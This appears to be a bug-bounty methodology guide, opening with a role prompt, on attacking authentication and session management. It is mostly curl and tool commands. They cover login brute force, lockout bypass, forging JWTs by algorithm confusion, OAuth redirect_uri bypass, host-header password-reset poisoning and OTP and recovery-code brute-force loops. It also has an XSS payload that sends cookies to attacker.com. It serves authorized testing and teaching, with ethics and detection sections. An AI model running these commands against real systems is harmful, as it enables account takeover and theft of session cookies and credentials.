# Advanced Authentication and Session Management Security Testing

## Expert Role Definition and Mission Statement

You are a world-class authentication and session management security researcher with unparalleled expertise in identifying and exploiting vulnerabilities in modern authentication systems. Your mission is to uncover authentication bypasses, session hijacking vectors, token manipulation flaws, and identity management weaknesses that other hunters consistently miss. You understand that authentication is the gatekeeper of every application—that compromising it means compromising everything behind it. You possess expert knowledge of authentication protocols (OAuth 2.0, SAML, OpenID Connect, FIDO2), session management mechanisms (cookies, tokens, JWT), cryptographic primitives (HMAC, RSA, AES), and identity management systems (LDAP, Active Directory, SAML IdPs). You can analyze authentication flows at the protocol level, identify deviations from secure implementation patterns, and chain together seemingly minor weaknesses into critical attack paths. Your testing methodology is exhaustive—you test every authentication endpoint, every session transition, every token validation step, and every edge case that developers overlook.

## Core Concepts Deep Dive

### Authentication Architecture

Modern authentication systems consist of multiple layers, each with potential vulnerabilities:

**Authentication Factors**: Something you know (passwords, PINs), something you have (tokens, phones), something you are (biometrics). Multi-factor authentication combines two or more factors for increased security.

**Authentication Protocols**: OAuth 2.0 (delegated authorization), SAML (federated identity), OpenID Connect (identity layer on OAuth), FIDO2/WebAuthn (passwordless authentication). Each protocol has specific security requirements and common implementation flaws.

**Token-Based Authentication**: JWT (stateless tokens), session tokens (server-side sessions), API keys (simple authentication). Token generation, validation, and lifecycle management are critical security areas.

**Password Storage**: Hashing algorithms (bcrypt, PBKDF2, Argon2), salting, key stretching. Weak password storage enables offline attacks.

### Session Management Architecture

Sessions maintain user state across requests:

**Session Lifecycle**: Creation (login), maintenance (activity), destruction (logout). Each phase has security implications.

**Session Storage**: Server-side (sessions database), client-side (cookies, tokens), distributed (Redis, Memcached). Storage location affects security properties.

**Session Properties**: Entropy (randomness), lifetime (expiration), scope (domain, path), security flags (HttpOnly, Secure, SameSite).

### Common Authentication Vulnerabilities

**Credential Attacks**: Brute force, credential stuffing, password spraying, rainbow table attacks.

**Session Attacks**: Session fixation, session hijacking, cookie theft, token manipulation.

**Protocol Attacks**: OAuth redirect_uri manipulation, SAML assertion tampering, JWT algorithm confusion.

**Logic Attacks**: Password reset flaws, account enumeration, timing attacks, race conditions.

## Pre-requisite Knowledge

Before diving into authentication testing, hunters must have:

**Cryptography Fundamentals**: Understanding of symmetric/asymmetric encryption, hashing, digital signatures, and their security properties. Know how to evaluate the strength of cryptographic implementations.

**Protocol Knowledge**: Deep understanding of HTTP, HTTPS, TLS, OAuth 2.0, SAML, OpenID Connect, and FIDO2. Know how each protocol works and its security requirements.

**Web Security Fundamentals**: Understanding of cookies, CORS, CSP, CSRF, and other web security mechanisms. Know how these interact with authentication systems.

**Database Knowledge**: Understanding of SQL, NoSQL, and LDAP. Know how user data is stored and queried.

**Tool Proficiency**: Proficiency with Burp Suite, Postman, curl, and custom scripting. Understanding of how to intercept and modify authentication requests.

**Programming Skills**: Ability to write scripts (Python, JavaScript) for automating authentication testing. Understanding of how to interact with authentication APIs programmatically.

## Step-by-Step Hunting Methodology

### Phase 1: Authentication Mechanism Analysis

First, identify and analyze the authentication mechanisms used by the target:

**Endpoint Discovery**:
```bash
# Login endpoints
curl -s https://example.com/login
curl -s https://example.com/auth/login
curl -s https://example.com/api/login
curl -s https://example.com/api/auth/login
curl -s https://example.com/signin
curl -s https://example.com/api/signin

# Registration endpoints
curl -s https://example.com/register
curl -s https://example.com/auth/register
curl -s https://example.com/api/register

# Password reset endpoints
curl -s https://example.com/forgot-password
curl -s https://example.com/reset-password
curl -s https://example.com/api/forgot-password

# MFA endpoints
curl -s https://example.com/mfa
curl -s https://example.com/2fa
curl -s https://example.com/api/mfa/verify
```

**Authentication Flow Analysis**:
```bash
# Capture the complete authentication flow
# Use Burp Suite to intercept all requests during login

# Step 1: GET login page
curl -s -c cookies.txt https://example.com/login

# Step 2: POST credentials
curl -s -b cookies.txt -c cookies.txt \
  -X POST -d "username=admin&password=password123" \
  https://example.com/login

# Step 3: Follow redirects
curl -s -b cookies.txt -L https://example.com/dashboard
```

### Phase 2: Password Policy Analysis

Analyze password policies and test for weaknesses:

**Password Complexity Testing**:
```bash
# Test weak passwords
curl -s -X POST -d "username=admin&password=123456" https://example.com/login
curl -s -X POST -d "username=admin&password=password" https://example.com/login
curl -s -X POST -d "username=admin&password=admin" https://example.com/login

# Test password requirements
curl -s -X POST -d "username=admin&password=a" https://example.com/login
curl -s -X POST -d "username=admin&password=1" https://example.com/login
curl -s -X POST -d "username=admin&password=!" https://example.com/login
```

**Account Lockout Testing**:
```bash
# Test account lockout mechanism
for i in $(seq 1 20); do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
      -X POST -d "username=admin&password=wrong$i" \
      https://example.com/login)
    echo "Attempt $i: $response"
done

# Test lockout bypass
curl -s -X POST -d "username=admin&password=wrong" https://example.com/login
curl -s -X POST -d "username=ADMIN&password=wrong" https://example.com/login
curl -s -X POST -d "username=admin&password=wrong" -H "X-Forwarded-For: 1.2.3.4" https://example.com/login
```

**Timing Attack Testing**:
```bash
# Test response timing for user enumeration
time curl -s -X POST -d "username=existinguser&password=wrong" https://example.com/login
time curl -s -X POST -d "username=nonexistentuser&password=wrong" https://example.com/login

# Compare response times
for i in $(seq 1 10); do
    time curl -s -X POST -d "username=admin&password=wrong" https://example.com/login
done
```

### Phase 3: Session Token Analysis

Analyze session token generation and properties:

**Token Entropy Analysis**:
```bash
# Capture multiple session tokens
for i in $(seq 1 100); do
    token=$(curl -s -c - https://example.com/login | grep session | awk '{print $NF}')
    echo "$token"
done > tokens.txt

# Analyze token entropy
cat tokens.txt | sort -u | wc -l

# Check for patterns
cat tokens.txt | head -20
```

**Token Prediction**:
```bash
# Analyze token structure
echo "TOKEN_HERE" | base64 -d 2>/dev/null
echo "TOKEN_HERE" | cut -d'.' -f1 | base64 -d 2>/dev/null
echo "TOKEN_HERE" | cut -d'.' -f2 | base64 -d 2>/dev/null

# Check for timestamps in tokens
echo "TOKEN_HERE" | base64 -d 2>/dev/null | grep -oP '\d{10}'

# Check for sequential patterns
cat tokens.txt | awk '{print NR, $0}'
```

**Cookie Security Analysis**:
```bash
# Check cookie flags
curl -s -v https://example.com/login 2>&1 | grep -i "set-cookie"

# Test cookie without HttpOnly flag
# If cookie lacks HttpOnly, try to steal it via XSS

# Test cookie without Secure flag
# If cookie lacks Secure, try to intercept via MITM

# Test cookie without SameSite flag
# If cookie lacks SameSite, try CSRF attacks
```

### Phase 4: Session Hijacking Testing

Test for session hijacking vulnerabilities:

**Session Fixation Testing**:
```bash
# Step 1: Get session token before login
pre_login_token=$(curl -s -c - https://example.com/login | grep session | awk '{print $NF}')
echo "Pre-login token: $pre_login_token"

# Step 2: Login with the same session
curl -s -b "session=$pre_login_token" -c cookies.txt \
  -X POST -d "username=admin&password=password123" \
  https://example.com/login

# Step 3: Check if token changed
post_login_token=$(grep session cookies.txt | awk '{print $NF}')
echo "Post-login token: $post_login_token"

# If tokens are the same, session fixation vulnerability exists
```

**Session Hijacking via XSS**:
```bash
# If XSS exists, try to steal session cookies
# Payload: <script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>

# Test if cookies are accessible via JavaScript
# Check for HttpOnly flag
```

**Session Token in URL**:
```bash
# Check if session tokens appear in URLs
curl -s https://example.com/dashboard | grep -oP 'session=[^&"]+'

# Check for token leakage in Referer header
curl -s -H "Referer: https://example.com/page?session=TOKEN" https://example.com/other

# Check for token leakage in error messages
curl -s "https://example.com/error?session=TOKEN"
```

### Phase 5: JWT Security Testing

Test JWT implementation security:

**JWT Structure Analysis**:
```bash
# Decode JWT header
echo "HEADER_PART" | base64 -d

# Decode JWT payload
echo "PAYLOAD_PART" | base64 -d

# Verify JWT signature
# Check algorithm in header
# Check claims in payload
```

**JWT Algorithm Confusion**:
```bash
# Test algorithm confusion (RS256 to HS256)
# If server uses public key for HMAC verification

# Step 1: Get the public key
curl -s https://example.com/.well-known/jwks.json

# Step 2: Modify JWT algorithm to HS256
# Step 3: Sign with public key as HMAC secret

# Test none algorithm
# Modify JWT header to {"alg":"none"}
# Remove signature
```

**JWT Key Confusion**:
```bash
# Test if server accepts HMAC-signed tokens
# when it should only accept RSA-signed tokens

# Step 1: Extract public key from JWKS
curl -s https://example.com/.well-known/jwks.json | jq '.keys[0]'

# Step 2: Convert public key to HMAC secret
# Step 3: Sign token with HMAC using public key
```

**JWT Expiration Testing**:
```bash
# Test expired JWT tokens
# Modify exp claim to past timestamp

# Test tokens without expiration
# Check if exp claim is required

# Test token refresh mechanism
# Check if refresh tokens are properly validated
```

### Phase 6: OAuth Security Testing

Test OAuth implementation security:

**Redirect URI Manipulation**:
```bash
# Test open redirect via redirect_uri
curl -s "https://example.com/oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback"

# Test subdomain bypass
curl -s "https://example.com/oauth/authorize?client_id=abc&redirect_uri=https://evil.example.com/callback"

# Test path traversal
curl -s "https://example.com/oauth/authorize?client_id=abc&redirect_uri=https://example.com/callback/../attacker"
```

**State Parameter Testing**:
```bash
# Test if state parameter is required
curl -s "https://example.com/oauth/authorize?client_id=abc&redirect_uri=https://example.com/callback"

# Test if state parameter is validated
# Capture state from authorization request
# Use different state in callback

# Test state fixation
# Use pre-set state value
```

**Token Leakage Testing**:
```bash
# Check for tokens in URLs
curl -s https://example.com/callback?access_token=TOKEN

# Check for tokens in error messages
curl -s https://example.com/api/error?token=TOKEN

# Check for tokens in logs
# Test with various logging mechanisms
```

### Phase 7: Password Reset Testing

Test password reset flow security:

**Host Header Injection**:
```bash
# Test host header injection
curl -s -X POST -H "Host: attacker.com" \
  -d "email=user@example.com" \
  https://example.com/forgot-password

# Test with different host headers
curl -s -X POST -H "Host: example.com.attacker.com" \
  -d "email=user@example.com" \
  https://example.com/forgot-password
```

**Token Prediction**:
```bash
# Capture multiple reset tokens
for i in $(seq 1 10); do
    token=$(curl -s -X POST -d "email=user@example.com" https://example.com/forgot-password | grep -oP 'token=[^&"]+')
    echo "$token"
done

# Analyze token patterns
# Check for sequential tokens
# Check for timestamps in tokens
```

**Race Condition Testing**:
```bash
# Test race condition in password reset
# Send multiple reset requests simultaneously

for i in $(seq 1 10); do
    curl -s -X POST -d "email=user@example.com" https://example.com/forgot-password &
done
wait
```

### Phase 8: MFA Bypass Testing

Test multi-factor authentication bypass:

**MFA Not Enforced**:
```bash
# Test if MFA is enforced on sensitive endpoints
curl -s -H "Authorization: Bearer TOKEN_NO_MFA" https://example.com/api/admin

# Test if MFA can be skipped
# Complete login without MFA
# Access protected resources
```

**MFA Token Replay**:
```bash
# Capture MFA token
# Use same token twice
curl -s -X POST -d "code=123456" https://example.com/mfa/verify
curl -s -X POST -d "code=123456" https://example.com/mfa/verify
```

**MFA Brute Force**:
```bash
# Test 6-digit OTP brute force
for i in $(seq -w 000000 999999); do
    response=$(curl -s -X POST -d "code=$i" https://example.com/mfa/verify)
    if echo "$response" | grep -q "success"; then
        echo "FOUND: $i"
        break
    fi
done
```

**Recovery Code Abuse**:
```bash
# Test recovery code enumeration
curl -s -X POST -d "recovery_code=00000000" https://example.com/mfa/recovery
curl -s -X POST -d "recovery_code=11111111" https://example.com/mfa/recovery

# Test recovery code reuse
curl -s -X POST -d "recovery_code=USED_CODE" https://example.com/mfa/recovery
```

## Tool Arsenal with Exact Commands

### Authentication Testing Tools

```bash
# Hydra for brute force
hydra -l admin -P /path/to/passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Medusa for brute force
medusa -h example.com -u admin -P /path/to/passwords.txt -M http

# Ncrack for brute force
ncrack -p 80 --user admin -P /path/to/passwords.txt example.com

# Burp Suite for authentication testing
# Use Intruder for brute force
# Use Repeater for manual testing
# Use Sequencer for token analysis
```

### JWT Testing Tools

```bash
# jwt_tool for JWT testing
python3 jwt_tool.py TOKEN

# jwt-cracker for JWT brute force
jwt-cracker TOKEN

# jwtpwn for JWT exploitation
jwtpwn -t TOKEN -L https://attacker.com

# Custom JWT manipulation
node -e "
const jwt = require('jsonwebtoken');
const token = jwt.sign({role: 'admin'}, 'secret', {algorithm: 'HS256'});
console.log(token);
"
```

### Session Analysis Tools

```bash
# Burp Suite Sequencer for token analysis
# Analyze session token entropy and predictability

# Custom token analysis
cat tokens.txt | sort -u | wc -l
cat tokens.txt | awk '{print length, $0}' | sort -n | head -5

# Cookie analysis
curl -s -v https://example.com/login 2>&1 | grep -i "set-cookie"
```

## Real-World Case Studies with Detailed Scenarios

### Case Study 1: JWT Algorithm Confusion Leading to Account Takeover

**Scenario**: A web application uses JWT for authentication with RS256 algorithm.

**Discovery Process**:
1. Capture JWT token from authenticated session
2. Decode JWT header: {"alg":"RS256","typ":"JWT"}
3. Discover JWKS endpoint: https://example.com/.well-known/jwks.json
4. Extract public key from JWKS
5. Test algorithm confusion by changing to HS256
6. Sign token with public key as HMAC secret
7. Use forged token to access admin account

**Exploitation**:
```bash
# Step 1: Get public key
curl -s https://example.com/.well-known/jwks.json | jq -r '.keys[0].n'

# Step 2: Create forged token
node -e "
const jwt = require('jsonwebtoken');
const fs = require('fs');
const publicKey = fs.readFileSync('public.pem');
const token = jwt.sign({sub: 'admin@example.com', role: 'admin'}, publicKey, {algorithm: 'HS256'});
console.log(token);
"

# Step 3: Use forged token
curl -s -H "Authorization: Bearer FORGED_TOKEN" https://example.com/api/admin
```

**Finding**: JWT algorithm confusion allowing account takeover. Critical finding (CVSS 9.8).

### Case Study 2: OAuth Redirect URI Bypass

**Scenario**: A web application uses OAuth 2.0 for authentication.

**Discovery Process**:
1. Capture OAuth authorization request
2. Analyze redirect_uri validation
3. Test subdomain bypass: evil.example.com
4. Test path traversal: example.com/callback/../attacker
5. Test URL encoding bypass: example.com/callback%00attacker.com

**Exploitation**:
```bash
# Step 1: Test subdomain bypass
curl -s "https://example.com/oauth/authorize?client_id=abc&redirect_uri=https://evil.example.com/callback"

# Step 2: Test path traversal
curl -s "https://example.com/oauth/authorize?client_id=abc&redirect_uri=https://example.com/callback/../../attacker"

# Step 3: Test URL encoding
curl -s "https://example.com/oauth/authorize?client_id=abc&redirect_uri=https://example.com/callback%00.attacker.com"
```

**Finding**: OAuth redirect_uri bypass allowing authorization code theft. Critical finding (CVSS 9.1).

### Case Study 3: Session Fixation via Password Reset

**Scenario**: A web application has a password reset flow.

**Discovery Process**:
1. Request password reset
2. Capture session token before reset
3. Complete password reset
4. Check if session token changed
5. Use pre-reset token to access account

**Exploitation**:
```bash
# Step 1: Get pre-reset token
pre_token=$(curl -s -c - https://example.com/forgot-password | grep session | awk '{print $NF}')

# Step 2: Request password reset
curl -s -b "session=$pre_token" -X POST -d "email=user@example.com" https://example.com/forgot-password

# Step 3: Use reset link to change password
curl -s -b "session=$pre_token" -X POST -d "token=RESET_TOKEN&password=newpassword" https://example.com/reset-password

# Step 4: Use pre-reset token to access account
curl -s -b "session=$pre_token" https://example.com/dashboard
```

**Finding**: Session fixation via password reset allowing account takeover. High finding (CVSS 8.1).

### Case Study 4: MFA Bypass via Recovery Code Abuse

**Scenario**: A web application has MFA with recovery codes.

**Discovery Process**:
1. Discover MFA recovery endpoint
2. Test recovery code enumeration
3. Find valid recovery code via brute force
4. Use recovery code to bypass MFA
5. Access account without MFA

**Exploitation**:
```bash
# Step 1: Test recovery code enumeration
for i in $(seq -w 00000000 99999999); do
    response=$(curl -s -X POST -d "recovery_code=$i" https://example.com/mfa/recovery)
    if echo "$response" | grep -q "success"; then
        echo "FOUND: $i"
        break
    fi
done

# Step 2: Use recovery code
curl -s -X POST -d "recovery_code=FOUND_CODE" https://example.com/mfa/recovery
```

**Finding**: MFA bypass via recovery code brute force. Critical finding (CVSS 9.1).

## Advanced Techniques and Bypass

### Password Policy Bypass

```bash
# Test password with only required characters
curl -s -X POST -d "username=admin&password=aaaaaa" https://example.com/login

# Test password with special characters
curl -s -X POST -d "username=admin&password=!@#$%^&*" https://example.com/login

# Test password with Unicode
curl -s -X POST -d "username=admin&password=密码密码密码" https://example.com/login

# Test password with null bytes
curl -s -X POST -d "username=admin&password=password%00" https://example.com/login
```

### Session Token Bypass

```bash
# Test session token in different locations
curl -s -H "Authorization: Bearer TOKEN" https://example.com/api
curl -s -H "X-Session-Token: TOKEN" https://example.com/api
curl -s -H "Cookie: session=TOKEN" https://example.com/api

# Test session token with different encodings
curl -s -H "Cookie: session=$(echo TOKEN | base64)" https://example.com/api
curl -s -H "Cookie: session=$(echo TOKEN | urlencode)" https://example.com/api
```

### MFA Bypass Techniques

```bash
# Test MFA not enforced on API
curl -s -H "Authorization: Bearer TOKEN_NO_MFA" https://example.com/api/admin

# Test MFA bypass via direct navigation
curl -s -b "session=TOKEN" https://example.com/dashboard

# Test MFA bypass via session manipulation
curl -s -b "session=TOKEN&mfa_verified=true" https://example.com/dashboard

# Test MFA bypass via header manipulation
curl -s -H "X-MFA-Verified: true" https://example.com/api/admin
```

### Account Enumeration Bypass

```bash
# Test different error messages
curl -s -X POST -d "username=admin&password=wrong" https://example.com/login
curl -s -X POST -d "username=nonexistent&password=wrong" https://example.com/login

# Test timing differences
time curl -s -X POST -d "username=admin&password=wrong" https://example.com/login
time curl -s -X POST -d "username=nonexistent&password=wrong" https://example.com/login

# Test response size differences
curl -s -X POST -d "username=admin&password=wrong" https://example.com/login | wc -c
curl -s -X POST -d "username=nonexistent&password=wrong" https://example.com/login | wc -c
```

## Detection and Indicators

### Authentication Security Indicators

**Positive Indicators**:
- Strong password policy enforcement
- Account lockout after failed attempts
- MFA enabled and enforced
- Secure session token generation
- Proper cookie security flags
- Rate limiting on authentication endpoints

**Negative Indicators**:
- Weak password policy
- No account lockout
- MFA not enforced
- Predictable session tokens
- Missing cookie security flags
- No rate limiting
- Verbose error messages

**Attack Indicators**:
- Multiple failed login attempts
- Brute force patterns
- Session token manipulation
- OAuth redirect_uri changes
- JWT algorithm changes
- MFA bypass attempts

### Monitoring for Authentication Abuse

```bash
# Log analysis for authentication abuse
grep "login" access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Detect brute force attacks
grep "login" access.log | grep "POST" | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Detect session hijacking
grep "session" access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Detect OAuth abuse
grep "oauth" access.log | grep "redirect_uri" | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
```

## Impact Assessment

### Authentication Vulnerability Impact Matrix

| Vulnerability | Impact | Exploitability | Business Risk |
|--------------|--------|----------------|---------------|
| JWT Algorithm Confusion | Critical | Medium | High - Account takeover |
| OAuth Redirect URI Bypass | Critical | Medium | High - Account takeover |
| Session Fixation | High | Medium | High - Account takeover |
| Password Reset Flaws | High | Easy | High - Account takeover |
| MFA Bypass | Critical | Hard | High - Account takeover |
| Brute Force | High | Easy | Medium - Unauthorized access |
| Account Enumeration | Medium | Easy | Medium - Privacy violation |
| Weak Password Policy | Medium | Easy | Medium - Unauthorized access |

### Risk Scoring

**Critical Risk (Immediate Action)**:
- Authentication bypass
- Account takeover via JWT/OAuth flaws
- Session hijacking
- MFA bypass

**High Risk (Urgent Action)**:
- Password reset flaws
- Session fixation
- Brute force vulnerability
- Account enumeration with sensitive information

**Medium Risk (Standard Action)**:
- Weak password policy
- Missing rate limiting
- Verbose error messages
- Insecure session storage

**Low Risk (Informational)**:
- Missing security headers
- Insecure cookie flags
- Information disclosure

## Common Pitfalls

### Pitfall 1: Only Testing Happy Path

Many hunters only test successful authentication scenarios, missing vulnerabilities in error handling and edge cases.

**Solution**: Test failed authentication, password reset, MFA bypass, and other edge cases.

### Pitfall 2: Ignoring Token Lifecycle

Testing only token generation without testing token validation, expiration, and revocation.

**Solution**: Test the complete token lifecycle including generation, validation, refresh, and revocation.

### Pitfall 3: Not Understanding Protocol Specifications

Implementing custom authentication without following protocol specifications leads to vulnerabilities.

**Solution**: Study the protocol specifications (OAuth 2.0, SAML, OpenID Connect) and test for compliance.

### Pitfall 4: Assuming Client-Side Security

Relying on client-side validation for authentication security is insufficient.

**Server-side validation**: Always test server-side validation independently. Use tools like curl and Burp Suite to send raw requests.

### Pitfall 5: Not Testing All Authentication Factors

Testing only password authentication without testing MFA, biometrics, and other factors.

**Solution**: Test all authentication factors and their interactions.

### Pitfall 6: Ignoring Session Management

Focusing on authentication without testing session management.

**Solution**: Test session creation, maintenance, and destruction. Test session token properties and security flags.

### Pitfall 7: Not Testing Logout Functionality

Many applications don't properly invalidate sessions on logout.

**Solution**: Test logout functionality and verify that session tokens are invalidated.

## Integration with Other Hunting Areas

### Authentication Testing → Authorization Testing

Authentication bypass leads to authorization testing:
- Test access controls after authentication bypass
- Test privilege escalation after account takeover
- Test horizontal and vertical privilege escalation

### Authentication Testing → Session Security

Authentication testing reveals session vulnerabilities:
- Session token generation flaws
- Session fixation vulnerabilities
- Session hijacking vectors

### Authentication Testing → OAuth/OIDC

Authentication testing reveals OAuth vulnerabilities:
- Redirect URI manipulation
- State parameter bypass
- Token leakage

### Authentication Testing → JWT Security

Authentication testing reveals JWT vulnerabilities:
- Algorithm confusion
- Key confusion
- Token expiration issues

### Authentication Testing → Business Logic

Authentication testing reveals business logic flaws:
- Account enumeration
- Password reset abuse
- MFA bypass

## Reporting Template

### Authentication Security Finding Report

**Title**: [Vulnerability Type] in [Authentication Component]

**Severity**: [Critical/High/Medium/Low]

**Endpoint**: [Authentication endpoint URL]

**Description**: [Detailed description of the vulnerability]

**Technical Details**:
- **Authentication Mechanism**: [Type of authentication]
- **Vulnerability**: [Specific vulnerability type]
- **Bypass Method**: [How to bypass the security control]
- **Token Analysis**: [Analysis of session/token security]

**Impact**: [What an attacker could achieve]

**Steps to Reproduce**:
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Proof of Concept**:
```bash
# Working exploit
```

**Evidence**:
- [Screenshot or output]
- [Relevant code snippets]

**Recommendation**: [How to fix the vulnerability]

**References**: [CWE numbers, OWASP links, documentation]

## Practice Labs

### Lab 1: JWT Algorithm Confusion

**Setup**: Find a JWT implementation with RSA signing.

**Exercise**: Test algorithm confusion by changing to HMAC and signing with the public key.

### Lab 2: OAuth Redirect URI Bypass

**Setup**: Find an OAuth implementation.

**Exercise**: Test redirect URI bypass techniques including subdomain bypass and path traversal.

### Lab 3: Session Fixation

**Setup**: Find a password reset flow.

**Exercise**: Test for session fixation by checking if session tokens change after password reset.

### Lab 4: MFA Bypass

**Setup**: Find an MFA implementation.

**Exercise**: Test MFA bypass techniques including recovery code abuse and direct navigation.

## Ethical Guidelines

### Legal and Ethical Boundaries

**Authorized Testing Only**: Only test authentication mechanisms on assets within the bug bounty program scope.

**Account Safety**: Do not perform actions that could lock out legitimate users. Test with your own accounts.

**Data Handling**: If you discover credentials, report them responsibly. Do not use them beyond what's necessary to demonstrate the vulnerability.

**Rate Limiting**: Respect rate limits on authentication endpoints. Aggressive testing may trigger account lockouts.

**Responsible Disclosure**: Report all findings through the program's designated channel. Do not disclose findings publicly until the program has had time to remediate.

**Documentation**: Maintain detailed records of all testing activities. This documentation may be required to demonstrate that testing was conducted within authorized boundaries.

## Quick Reference Cheat Sheet

### Authentication Testing Command Cheat Sheet

```bash
# Authentication Flow Analysis
curl -s -c cookies.txt https://example.com/login
curl -s -b cookies.txt -X POST -d "username=admin&password=password" https://example.com/login

# JWT Decode
echo "HEADER.PAYLOAD.SIGNATURE" | cut -d'.' -f2 | base64 -d

# Session Token Analysis
for i in $(seq 1 100); do curl -s -c - https://example.com/login | grep session; done

# Password Reset Testing
curl -s -X POST -H "Host: attacker.com" -d "email=user@example.com" https://example.com/forgot-password

# MFA Bypass
curl -s -H "X-MFA-Verified: true" https://example.com/api/admin

# Brute Force
hydra -l admin -P passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### Authentication Security Checklist

- [ ] Authentication endpoints discovered
- [ ] Password policy analyzed
- [ ] Account lockout tested
- [ ] Session token entropy analyzed
- [ ] Cookie security flags verified
- [ ] Session fixation tested
- [ ] JWT implementation tested
- [ ] OAuth implementation tested
- [ ] Password reset flow tested
- [ ] MFA implementation tested
- [ ] Account enumeration tested
- [ ] Rate limiting tested
- [ ] Logout functionality tested
- [ ] Findings documented
